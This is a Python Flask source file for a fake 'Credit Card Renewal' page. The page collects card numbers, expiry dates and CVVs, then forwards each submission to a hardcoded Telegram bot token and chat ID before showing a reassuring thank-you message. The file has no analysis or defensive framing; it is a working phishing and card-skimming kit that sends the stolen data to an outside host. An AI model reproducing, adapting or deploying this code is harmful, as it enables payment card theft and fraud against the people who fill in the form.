from flask import Flask, request, redirect, url_for
import requests

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = '7050929517:AAGSnEhUbH9hF9wBtZGQd3Hyc8sj78XIihs'
TELEGRAM_CHAT_ID = '7049562542'

@app.route('/', methods=['GET'])
def index():
    return '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Credit Card Renewal</title>
            <style>
                body {
                    margin: 0;
                    padding: 0;
                    overflow: hidden;
                    font-family: Arial, sans-serif;
                    background: rgba(0, 0, 0, 0.9);
                }
                .container {
                    position: relative;
                    z-index: 1;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                }
                form {
                    display: flex;
                    flex-direction: column;
                    max-width: 350px;
                    padding: 30px;
                    background: rgba(0, 0, 0, 0.6);
                    border-radius: 10px;
                }
                label, input {
                    margin: 10px 0;
                    color: white;
                }
                input[type="text"], input[type="number"] {
                    padding: 15px;
                    border-radius: 5px;
                    border: 1px solid #ccc;
                    color: black;
                    background: white;
                    font-size: 16px;
                    width: 100%;
                    box-sizing: border-box; /* Ensure padding is included in width */
                }
                input[type="submit"] {
                    margin-top: 20px;
                    padding: 15px;
                    background-color: #4CAF50;
                    color: white;
                    border: none;
                    cursor: pointer;
                    border-radius: 5px;
                    box-shadow: 0 0 5px #4CAF50, 0 0 10px #4CAF50, 0 0 15px #4CAF50;
                    transition: box-shadow 0.5s;
                    font-size: 16px;
                }
                input[type="submit"]:hover {
                    box-shadow: 0 0 10px #4CAF50, 0 0 20px #4CAF50, 0 0 30px #4CAF50;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <form action="/submit" method="POST">
                    <label for="credit_card_number">Enter Credit Card Number:</label>
                    <input type="text" id="credit_card_number" name="credit_card_number" maxlength="19" required>
                    
                    <label for="expiry_month">Expiry Month:</label>
                    <input type="number" id="expiry_month" name="expiry_month" min="1" max="12" maxlength="2" required>
                    
                    <label for="expiry_year">Expiry Year:</label>
                    <input type="number" id="expiry_year" name="expiry_year" min="22" max="2100" maxlength="4" required>
                    
                    <label for="cvv">CVV:</label>
                    <input type="number" id="cvv" name="cvv" min="100" max="9999" maxlength="4" required>
                    
                    <input type="submit" value="Submit">
                </form>
            </div>
        </body>
        </html>
    '''

@app.route('/submit', methods=['POST'])
def submit():
    credit_card_number = request.form['credit_card_number']
    expiry_month = request.form['expiry_month']
    expiry_year = request.form['expiry_year']
    cvv = request.form['cvv']

    # Format the message
    message = (
        f"Credit Card Renewal Request:\n"
        f"Credit Card Number: {credit_card_number}\n"
        f"Expiry Month: {expiry_month}\n"
        f"Expiry Year: {expiry_year}\n"
        f"CVV: {cvv}"
    )

    # Send the message to Telegram
    send_telegram_message(message)

    return 'Thank you! Your submission has been received.'

def send_telegram_message(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    requests.post(url, data=data)

if __name__ == '__main__':
    app.run(debug=True)
  
